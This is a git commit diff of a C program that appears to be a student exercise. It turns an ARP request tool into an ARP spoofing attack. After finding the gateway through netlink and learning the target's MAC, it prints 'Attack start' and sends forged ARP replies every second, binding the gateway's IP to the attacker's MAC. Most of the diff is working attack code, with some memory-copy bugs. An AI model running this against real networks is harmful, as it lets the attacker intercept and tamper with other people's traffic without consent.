b531bbce5ec9d66075822848d53b11ac1fa0a316
Ri0S <aa248424@gmail.com>
2016-07-18 05:30:24 +0900

    done

--- main.c
+++ main.c
@@ -9,6 +9,7 @@
 #include <netinet/if_ether.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
+#include <linux/rtnetlink.h>
 #include <arpa/inet.h>
 #define DEBUG_LEVEL_	3
 
@@ -21,9 +22,21 @@
 #define dp0(n, fmt)
 #define _dp(n, fmt, args...)
 #endif	/* DEBUG_LEVEL_ */
+
+struct route_info
+{
+    struct in_addr dstAddr;
+    struct in_addr srcAddr;
+    struct in_addr gateWay;
+    char ifName[IF_NAMESIZE];
+};
+
 int callback(const u_char *packet, u_char *t_mac);
-int getIPAddress(char *ip_addr,char *dev);
+int getIPAddress(char *ip_addr,char *dev); //host ip,mac gateway ip 정보 구하는 함수는 구글링을 통해 얻었습니다.
 int getMacAddress(u_char *mac, char *dev);
+int getGatewayIP(char *gatewayip, socklen_t size);
+int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId);
+void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo);
 
 int main(int argc, char **argv){
     char *dev;
@@ -35,7 +48,7 @@ int main(int argc, char **argv){
     const u_char *packet;
     u_char *cp;
     u_char sp_buf[1024];
-    u_char t_ip[16], s_ip[16], t_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff}, s_mac[6];
+    u_char t_ip[16], s_ip[16], g_ip[16], t_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff}, s_mac[6];
 
     struct bpf_program fp;
 
@@ -56,17 +69,13 @@ int main(int argc, char **argv){
     scanf("%s", t_ip);
     getIPAddress(s_ip, dev);
     getMacAddress(s_mac, dev);
-    printf("Source MAC Adress: %s\n", s_mac);
-    for(int i=0; i<5; i++)
-        printf("%02x:",s_mac[i]);
-    printf("%02x\n",s_mac[5]);
-
-
+    getGatewayIP(g_ip, 16);
     printf("Source IP Adress: %s\n", s_ip);
-
-    cp = sp_buf;
+    printf("Gateway IP Adress: %s\n", g_ip);
 
     struct ether_header etheh;
+
+    cp = sp_buf;
     memcpy(etheh.ether_dhost, t_mac, 12);
     memcpy(etheh.ether_shost, s_mac, 12);
     etheh.ether_type = htons(ETHERTYPE_ARP);
@@ -85,23 +94,51 @@ int main(int argc, char **argv){
     arph.ea_hdr.ar_op = htons(1);
     memcpy(cp, &arph, sizeof(struct ether_arp)); //arp 패킷 세팅
 
-    pcap_inject(pcd,sp_buf,sizeof(struct ether_header)+sizeof(struct ether_arp));
+    if((pcap_inject(pcd,sp_buf,sizeof(struct ether_header)+sizeof(struct ether_arp))) ==-1) {
+        pcap_perror(pcd,0);
+        pcap_close(pcd);
+        exit(1);
+    };
 
 
     // 패킷이 캡쳐되면 callback함수를 실행한다.
     while(1){
 
         packet = pcap_next(pcd, &hdr);
-        if(callback(packet) == 1)
+        if(callback(packet, t_mac) == 1)
             break;
     }
+    printf("Source MAC Address: ");
+    for(int i=0; i<5; i++)
+        printf("%2x:", s_mac[i]);
+    printf("%2x\n", s_mac[5]);
+    printf("Target MAC Address: ");
+    for(int i=0; i<5; i++)
+        printf("%2x:", t_mac[i]);
+    printf("%2x\n", t_mac[5]);
 
+    printf("Attack start\n"); //타겟에 게이트웨이 ip와 자신의 mac을 담은 arp reply패킷을 전송한다
+    inet_aton(g_ip, &(arph.arp_spa));
+    arph.ea_hdr.ar_op = htons(2);
+
+    cp = sp_buf;
+    cp += sizeof(struct ether_header);
+    memcpy(cp, &arph, sizeof(struct ether_arp)); //arp 패킷 세팅
+
+    while(1){
+        printf("send arp reply packet\n");
+        if((pcap_inject(pcd,sp_buf,sizeof(struct ether_header)+sizeof(struct ether_arp))) ==-1) {
+            pcap_perror(pcd,0);
+            pcap_close(pcd);
+            exit(1);
+        };
+        sleep(1);
+    }
+    return 0;
 }
 int callback(const u_char *packet, u_char * t_mac){
     struct ether_header *etheh; // Ethernet 헤더 구조체
     unsigned short ether_type;
-    int chcnt =0;
-    int length=pkthdr->len;
 
     // 이더넷 헤더를 가져온다.
     etheh = (struct ether_header *)packet;
@@ -169,4 +206,146 @@ int getMacAddress(u_char *mac, char *dev){
 
     close(sock);
     return 1;
+}
+int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId){
+    struct nlmsghdr *nlHdr;
+    int readLen = 0, msgLen = 0;
+
+    do{
+        /* Recieve response from the kernel */
+        if((readLen = recv(sockFd, bufPtr, 8192 - msgLen, 0)) < 0)        {
+            perror("SOCK READ: ");
+            return -1;
+        }
+
+        nlHdr = (struct nlmsghdr *)bufPtr;
+
+        /* Check if the header is valid */
+        if((NLMSG_OK(nlHdr, readLen) == 0) || (nlHdr->nlmsg_type == NLMSG_ERROR)){
+            perror("Error in recieved packet");
+            return -1;
+        }
+
+        /* Check if the its the last message */
+        if(nlHdr->nlmsg_type == NLMSG_DONE){
+            break;
+        }
+        else{
+            /* Else move the pointer to buffer appropriately */
+            bufPtr += readLen;
+            msgLen += readLen;
+        }
+
+
+        /* Check if its a multi part message */
+        if((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0){
+            /* return if its not */
+            break;
+        }
+    } while((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pId));
+
+    return msgLen;
+}
+
+/* parse the route info returned */
+void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo){
+    struct rtmsg *rtMsg;
+    struct rtattr *rtAttr;
+    int rtLen;
+
+    rtMsg = (struct rtmsg *)NLMSG_DATA(nlHdr);
+
+    /* If the route is not for AF_INET or does not belong to main routing table	then return. */
+    if((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))
+        return;
+
+    /* get the rtattr field */
+    rtAttr = (struct rtattr *)RTM_RTA(rtMsg);
+    rtLen = RTM_PAYLOAD(nlHdr);
+
+    for(;RTA_OK(rtAttr,rtLen);rtAttr = RTA_NEXT(rtAttr,rtLen)){
+        switch(rtAttr->rta_type){
+            case RTA_OIF:
+            if_indextoname(*(int *)RTA_DATA(rtAttr), rtInfo->ifName);
+            break;
+
+            case RTA_GATEWAY:
+            memcpy(&rtInfo->gateWay, RTA_DATA(rtAttr), sizeof(rtInfo->gateWay));
+            break;
+
+            case RTA_PREFSRC:
+            memcpy(&rtInfo->srcAddr, RTA_DATA(rtAttr), sizeof(rtInfo->srcAddr));
+            break;
+
+            case RTA_DST:
+            memcpy(&rtInfo->dstAddr, RTA_DATA(rtAttr), sizeof(rtInfo->dstAddr));
+            break;
+        }
+    }
+
+    return;
+}
+int getGatewayIP(char *gatewayip, socklen_t size){
+    int found_gatewayip = 0;
+
+    struct nlmsghdr *nlMsg;
+    struct rtmsg *rtMsg;
+    struct route_info *rtInfo;
+    char msgBuf[8192]; // pretty large buffer
+
+    int sock, len, msgSeq = 0;
+
+    /* Create Socket */
+    if((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE)) < 0){
+        perror("Socket Creation: ");
+        return(-1);
+    }
+
+    /* Initialize the buffer */
+    memset(msgBuf, 0, 8192);
+
+    /* point the header and the msg structure pointers into the buffer */
+    nlMsg = (struct nlmsghdr *)msgBuf;
+    rtMsg = (struct rtmsg *)NLMSG_DATA(nlMsg);
+
+    /* Fill in the nlmsg header*/
+    nlMsg->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg)); // Length of message.
+    nlMsg->nlmsg_type = RTM_GETROUTE; // Get the routes from kernel routing table .
+
+    nlMsg->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST; // The message is a request for dump.
+    nlMsg->nlmsg_seq = msgSeq++; // Sequence of the message packet.
+    nlMsg->nlmsg_pid = getpid(); // PID of process sending the request.
+
+    /* Send the request */
+    if(send(sock, nlMsg, nlMsg->nlmsg_len, 0) < 0){
+        fprintf(stderr, "Write To Socket Failed...\n");
+        return -1;
+    }
+
+    /* Read the response */
+    if((len = readNlSock(sock, msgBuf, msgSeq, getpid())) < 0){
+        fprintf(stderr, "Read From Socket Failed...\n");
+        return -1;
+    }
+
+    /* Parse and print the response */
+    rtInfo = (struct route_info *)malloc(sizeof(struct route_info));
+
+    for(;NLMSG_OK(nlMsg,len);nlMsg = NLMSG_NEXT(nlMsg,len)){
+        memset(rtInfo, 0, sizeof(struct route_info));
+        parseRoutes(nlMsg, rtInfo);
+
+        // Check if default gateway
+        if (strstr((char *)inet_ntoa(rtInfo->dstAddr), "0.0.0.0")){
+            // copy it over
+            inet_ntop(AF_INET, &rtInfo->gateWay, gatewayip, size);
+            found_gatewayip = 1;
+            break;
+        }
+    }
+
+    free(rtInfo);
+    close(sock);
+
+    return found_gatewayip;
 }
